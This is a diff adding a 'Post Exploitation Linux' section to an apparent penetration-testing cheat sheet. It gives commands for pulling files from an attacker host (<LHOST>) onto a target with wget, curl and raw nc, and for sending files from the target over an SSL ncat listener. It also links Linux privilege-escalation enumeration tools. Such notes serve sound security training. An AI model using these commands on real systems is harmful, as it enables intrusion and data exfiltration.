@@ -350,3 +350,27 @@ Web Exploitation
 <br>
 Post Exploitation Linux
 ===============================================================================================
+
+`File Upload`
+
+-    Starting Web Server  
+     `python3 -m http.server 80`
+     
+-    Filetransfer  
+
+         wget <LHOST>/<file>
+         curl http://<LHOST>/<file> -o <output-file>
+         echo "GET /<file> HTTP/1.0" | nc -n <LHOST> 80 > <out-file> && sed -i '1,7d' <out-file>
+    
+-    Secure Filetransfers  
+
+         on target:  ncat -nvlp <port> --ssl > <out-file>
+         on kali:  ncat -nv <RHOST> <RPORT> --ssl < <file-to-send>
+     
+`Enum Tools`
+
+[Linenum](https://github.com/rebootuser/LinEnum)
+[linux smart enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+[linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+[pspy](https://github.com/DominicBreuker/pspy)
+[suid3num](https://github.com/Anon-Exploiter/SUID3NUM)
